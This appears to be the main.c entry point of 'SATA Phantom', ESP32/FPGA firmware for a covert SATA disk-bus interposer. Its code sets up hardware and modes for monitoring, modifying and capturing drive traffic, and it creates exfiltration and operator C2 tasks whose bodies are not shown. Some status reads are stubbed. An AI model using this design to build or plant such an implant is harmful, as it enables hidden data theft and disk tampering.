/**
 * @file main.c
 * @author jayis1
 * @brief SATA Phantom — Main entry point
 *
 * Initializes the ESP32-S3 MCU, creates all RTOS tasks, and manages
 * system state transitions for the SATA Phantom bus interposer.
 *
 * Copyright © 2025 jayis1. All rights reserved.
 * Authorized security research use only.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/event_groups.h"
#include "esp_system.h"
#include "esp_log.h"
#include "esp_sleep.h"
#include "driver/gpio.h"
#include "driver/spi_master.h"
#include "nvs_flash.h"
#include "board.h"
#include "registers.h"

/* Task stack sizes */
#define TASK_STACK_CTRL         4096
#define TASK_STACK_POLICY       8192
#define TASK_STACK_PROTO        4096
#define TASK_STACK_EXFIL        12288
#define TASK_STACK_C2           8192
#define TASK_STACK_DISPLAY      2048
#define TASK_STACK_POWER        2048

/* Task priorities */
#define TASK_PRIO_CTRL          5
#define TASK_PRIO_POLICY        3
#define TASK_PRIO_PROTO         3
#define TASK_PRIO_EXFIL         1
#define TASK_PRIO_C2            1
#define TASK_PRIO_DISPLAY       1
#define TASK_PRIO_POWER         4

/* Tag for logging */
static const char *TAG = "sata-phantom";

/* Event group bits for global system state */
#define EVENT_BIT_FPGA_READY        (1 << 0)  /* FPGA configured and responsive */
#define EVENT_BIT_LINK_UP           (1 << 1)  /* SATA link established */
#define EVENT_BIT_FRAME_MATCH       (1 << 2)  /* Rule match detected by FPGA */
#define EVENT_BIT_CAPTURE_AVAIL     (1 << 3)  /* Captured frame ready in scratch */
#define EVENT_BIT_EXFIL_REQ         (1 << 4)  /* Exfiltration requested */
#define EVENT_BIT_C2_CONNECTED      (1 << 5)  /* Operator C2 channel established */
#define EVENT_BIT_CONFIG_CHANGE     (1 << 6)  /* Configuration has changed (reload rules) */
#define EVENT_BIT_BATTERY_LOW       (1 << 7)  /* Battery level critical */
#define EVENT_BIT_DEEP_SLEEP        (1 << 8)  /* Enter deep sleep */
#define EVENT_BIT_USB_CONFIG        (1 << 9)  /* Enter USB config mode */
#define EVENT_BIT_ERROR_FATAL       (1 << 15) /* Fatal error — enter safe mode */

/* Global event group */
EventGroupHandle_t system_events;

/* Global queue for inter-task communication */
QueueHandle_t ctrl_cmd_queue;
QueueHandle_t capture_data_queue;

/* Current operation mode */
static operation_mode_t current_mode = MODE_TRANSPARENT;
static volatile bool fpga_initialized = false;

/* Forward declarations of task functions */
void ctrl_task(void *pvParameters);
void policy_engine_task(void *pvParameters);
void proto_parser_task(void *pvParameters);
void exfil_task(void *pvParameters);
void c2_server_task(void *pvParameters);
void display_task(void *pvParameters);
void power_mgmt_task(void *pvParameters);

/* ===================================================================
 * Hardware Initialization Functions
 * =================================================================== */

/**
 * @brief Reset the FPGA via GPIO pin and wait for configuration done.
 */
static void fpga_hardware_reset(void)
{
    ESP_LOGI(TAG, "Resetting FPGA...");
    gpio_set_level(PIN_FPGA_RESET, 0);
    vTaskDelay(pdMS_TO_TICKS(10));
    gpio_set_level(PIN_FPGA_RESET, 1);
    vTaskDelay(pdMS_TO_TICKS(100));
    ESP_LOGI(TAG, "FPGA reset complete");
}

/**
 * @brief Check if FPGA has finished configuration by polling DONE pin.
 * @return true if configured, false if timeout.
 */
static bool fpga_wait_config_done(void)
{
    int timeout_ms = 2000;  /* FPGA should configure in < 1 second */
    while (timeout_ms > 0) {
        if (gpio_get_level(PIN_FPGA_DONE)) {
            ESP_LOGI(TAG, "FPGA configuration complete (DONE pin high)");
            return true;
        }
        vTaskDelay(pdMS_TO_TICKS(10));
        timeout_ms -= 10;
    }
    ESP_LOGE(TAG, "FPGA configuration TIMEOUT waiting for DONE pin");
    return false;
}

/**
 * @brief Initialize SPI bus for FPGA communication.
 * @return ESP_OK on success.
 */
static esp_err_t spi_bus_init(void)
{
    spi_bus_config_t bus_cfg = {
        .mosi_io_num     = PIN_FPGA_SPI_MOSI,
        .miso_io_num     = PIN_FPGA_SPI_MISO,
        .sclk_io_num     = PIN_FPGA_SPI_SCLK,
        .quadwp_io_num   = -1,
        .quadhd_io_num   = -1,
        .max_transfer_sz = 4096,
    };
    esp_err_t ret = spi_bus_initialize(SPI2_HOST, &bus_cfg, SPI_DMA_CH_AUTO);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "SPI bus init failed: %d", ret);
    }
    return ret;
}

/**
 * @brief Initialize all GPIO pins for the board.
 */
static void gpio_init(void)
{
    /* FPGA control pins */
    gpio_config_t fpga_pins = {
        .pin_bit_mask = (1ULL << PIN_FPGA_IRQ) |
                        (1ULL << PIN_FPGA_BUSY) |
                        (1ULL << PIN_FPGA_DONE),
        .mode = GPIO_MODE_INPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE
    };
    gpio_config(&fpga_pins);

    /* FPGA output control */
    gpio_config_t fpga_out = {
        .pin_bit_mask = (1ULL << PIN_FPGA_RESET),
        .mode = GPIO_MODE_OUTPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE
    };
    gpio_config(&fpga_out);
    gpio_set_level(PIN_FPGA_RESET, 1); /* Release reset */

    /* Power control pins */
    gpio_config_t pwr_pins = {
        .pin_bit_mask = (1ULL << PIN_PWR_5V_EN) |
                        (1ULL << PIN_PWR_3V3_EN) |
                        (1ULL << PIN_PWR_1V2_EN) |
                        (1ULL << PIN_PWR_BAT_EN),
        .mode = GPIO_MODE_OUTPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE
    };
    gpio_config(&pwr_pins);

    /* Power sense pins (inputs) */
    gpio_config_t pwr_sense = {
        .pin_bit_mask = (1ULL << PIN_PWR_SATA_DETECT) |
                        (1ULL << PIN_PWR_USB_DETECT),
        .mode = GPIO_MODE_INPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE
    };
    gpio_config(&pwr_sense);

    /* e-Paper pins */
    gpio_config_t epd_pins = {
        .pin_bit_mask = (1ULL << PIN_EPD_BUSY) |
                        (1ULL << PIN_EPD_RESET) |
                        (1ULL << PIN_EPD_DC) |
                        (1ULL << PIN_EPD_CS),
        .mode = GPIO_MODE_OUTPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE
    };
    gpio_config(&epd_pins);

    ESP_LOGI(TAG, "GPIO initialization complete");
}

/**
 * @brief Initialize NVS for persistent configuration storage.
 */
static esp_err_t nvs_init(void)
{
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_LOGW(TAG, "NVS flash needs erase, erasing...");
        ret = nvs_flash_erase();
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "NVS erase failed: %d", ret);
            return ret;
        }
        ret = nvs_flash_init();
    }
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "NVS init failed: %d", ret);
    }
    return ret;
}

/**
 * @brief Initialize the I2C bus for the battery monitor.
 */
static esp_err_t i2c_init(void)
{
    i2c_config_t conf = {
        .mode = I2C_MODE_MASTER,
        .sda_io_num = PIN_BAT_I2C_SDA,
        .scl_io_num = PIN_BAT_I2C_SCL,
        .sda_pullup_en = GPIO_PULLUP_ENABLE,
        .scl_pullup_en = GPIO_PULLUP_ENABLE,
        .master.clk_speed = 100000
    };
    return i2c_param_config(BAT_I2C_PORT, &conf) |
           i2c_driver_install(BAT_I2C_PORT, conf.mode, 0, 0, 0);
}

/* ===================================================================
 * Mode Management
 * =================================================================== */

/**
 * @brief Switch the device to a new operation mode.
 * @param new_mode The target operation mode.
 */
static void set_operation_mode(operation_mode_t new_mode)
{
    if (new_mode == current_mode) {
        return;
    }

    ESP_LOGI(TAG, "Mode change: %d -> %d", current_mode, new_mode);
    current_mode = new_mode;

    /* Notify FPGA of mode change via control register */
    uint32_t ctrl_val = 0;
    switch (new_mode) {
        case MODE_TRANSPARENT:
            ctrl_val = CTRL_MAIN_PASSTHROUGH;
            break;
        case MODE_MONITOR:
            ctrl_val = CTRL_MAIN_MONITOR_EN;
            break;
        case MODE_ACTIVE:
            ctrl_val = CTRL_MAIN_MONITOR_EN | CTRL_MAIN_MODIFY_EN;
            break;
        case MODE_EXFIL:
            ctrl_val = CTRL_MAIN_MONITOR_EN | CTRL_MAIN_MODIFY_EN |
                       CTRL_MAIN_CAPTURE_EN;
            break;
        case MODE_DEEP_SLEEP:
            /* Power down sequence handled by power_mgmt_task */
            xEventGroupSetBits(system_events, EVENT_BIT_DEEP_SLEEP);
            return;
        case MODE_USB_CONFIG:
            xEventGroupSetBits(system_events, EVENT_BIT_USB_CONFIG);
            return;
    }

    /* Write mode to FPGA (simplified — actual SPI call via ctrl_task) */
    ctrl_cmd_t cmd = {
        .cmd_type = CTRL_CMD_WRITE_MODE,
        .data = ctrl_val
    };
    if (ctrl_cmd_queue) {
        xQueueSend(ctrl_cmd_queue, &cmd, pdMS_TO_TICKS(10));
    }
}

/* ===================================================================
 * Task Creation
 * =================================================================== */

static void create_tasks(void)
{
    /* Create inter-task communication channels */
    system_events = xEventGroupCreate();
    ctrl_cmd_queue = xQueueCreate(32, sizeof(ctrl_cmd_t));
    capture_data_queue = xQueueCreate(16, sizeof(capture_data_t));

    /* Create all tasks */
    xTaskCreate(ctrl_task,          "ctrl",     TASK_STACK_CTRL,    NULL, TASK_PRIO_CTRL,    NULL);
    xTaskCreate(policy_engine_task, "policy",   TASK_STACK_POLICY,  NULL, TASK_PRIO_POLICY,  NULL);
    xTaskCreate(proto_parser_task,  "proto",    TASK_STACK_PROTO,   NULL, TASK_PRIO_PROTO,   NULL);
    xTaskCreate(exfil_task,         "exfil",    TASK_STACK_EXFIL,   NULL, TASK_PRIO_EXFIL,   NULL);
    xTaskCreate(c2_server_task,     "c2",       TASK_STACK_C2,      NULL, TASK_PRIO_C2,      NULL);
    xTaskCreate(display_task,       "display",  TASK_STACK_DISPLAY, NULL, TASK_PRIO_DISPLAY, NULL);
    xTaskCreate(power_mgmt_task,    "power",    TASK_STACK_POWER,   NULL, TASK_PRIO_POWER,   NULL);

    ESP_LOGI(TAG, "All tasks created");
}

/* ===================================================================
 * Main Entry Point
 * =================================================================== */

void app_main(void)
{
    ESP_LOGI(TAG, "============================================");
    ESP_LOGI(TAG, "  SATA Phantom v%d.%d.%d", FW_VERSION_MAJOR, FW_VERSION_MINOR, FW_VERSION_PATCH);
    ESP_LOGI(TAG, "  Author: jayis1");
    ESP_LOGI(TAG, "  Build: %s %s", FW_BUILD_DATE, FW_BUILD_TIME);
    ESP_LOGI(TAG, "============================================");

    /* Boot reason — were we woken from deep sleep? */
    esp_sleep_wakeup_cause_t wake_cause = esp_sleep_get_wakeup_cause();
    if (wake_cause == ESP_SLEEP_WAKEUP_EXT0 || wake_cause == ESP_SLEEP_WAKEUP_TIMER) {
        ESP_LOGI(TAG, "Woke from deep sleep (cause: %d)", wake_cause);
    }

    /* Initialize subsystems */
    ESP_ERROR_CHECK(nvs_init());
    gpio_init();

    /* Enable power rails */
    gpio_set_level(PIN_PWR_5V_EN, 1);
    gpio_set_level(PIN_PWR_3V3_EN, 1);
    gpio_set_level(PIN_PWR_1V2_EN, 1);
    gpio_set_level(PIN_PWR_BAT_EN, 0);  /* Battery boost off unless needed */
    vTaskDelay(pdMS_TO_TICKS(50));

    ESP_ERROR_CHECK(spi_bus_init());
    ESP_ERROR_CHECK(i2c_init());

    /* FPGA initialization sequence */
    fpga_hardware_reset();
    if (!fpga_wait_config_done()) {
        ESP_LOGE(TAG, "FPGA failed to configure — entering safe mode");
        xEventGroupSetBits(system_events, EVENT_BIT_ERROR_FATAL);
    } else {
        fpga_initialized = true;
        xEventGroupSetBits(system_events, EVENT_BIT_FPGA_READY);
    }

    /* Read initial FPGA version */
    if (fpga_initialized) {
        /* Simplified: actual SPI call handled by ctrl_task */
        ESP_LOGI(TAG, "FPGA is ready and responsive");
    }

    /* Configure UART for debug console */
    uart_config_t uart_cfg = {
        .baud_rate = DEBUG_UART_BAUD,
        .data_bits = UART_DATA_8_BITS,
        .parity    = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE
    };
    uart_param_config(DEBUG_UART_PORT, &uart_cfg);
    uart_set_pin(DEBUG_UART_PORT, PIN_DEBUG_UART_TX, PIN_DEBUG_UART_RX, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
    uart_driver_install(DEBUG_UART_PORT, DEBUG_UART_BUF_SIZE, 0, 0, NULL, 0);

    /* Create RTOS tasks */
    create_tasks();

    /* Main loop — handles mode transitions and health monitoring */
    while (1) {
        EventBits_t bits = xEventGroupWaitBits(
            system_events,
            EVENT_BIT_CONFIG_CHANGE | EVENT_BIT_BATTERY_LOW |
                EVENT_BIT_ERROR_FATAL,
            pdTRUE,  /* Clear on exit */
            pdFALSE, /* Any bit triggers */
            pdMS_TO_TICKS(5000)  /* Check every 5 seconds */
        );

        if (bits & EVENT_BIT_ERROR_FATAL) {
            ESP_LOGE(TAG, "FATAL ERROR — entering safe mode");
            set_operation_mode(MODE_TRANSPARENT);
            /* Keep passthrough so the SATA link stays up, just no monitoring */
        }

        if (bits & EVENT_BIT_BATTERY_LOW) {
            ESP_LOGW(TAG, "Battery low — reducing RF activity");
            /* Reduce exfiltration rate, stop WiFi scanning */
            /* Handled by individual tasks checking the event group */
        }

        /* Periodic health check */
        uint32_t fpga_status = 0;
        /* In real impl: read FPGA_REG_STATUS via SPI */
        if ((fpga_status & SYS_STATUS_FATAL) && fpga_initialized) {
            ESP_LOGW(TAG, "FPGA reports fatal status — attempting reset");
            fpga_hardware_reset();
        }

        /* Check SATA link status */
        if (fpga_initialized) {
            uint32_t link_stat = 0;
            /* In real impl: read REG_STAT_LINK via SPI */
            if (link_stat & LINK_STAT_ESTABLISHED) {
                xEventGroupSetBits(system_events, EVENT_BIT_LINK_UP);
            } else {
                xEventGroupClearBits(system_events, EVENT_BIT_LINK_UP);
            }
        }

        /* Feed watchdog */
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}
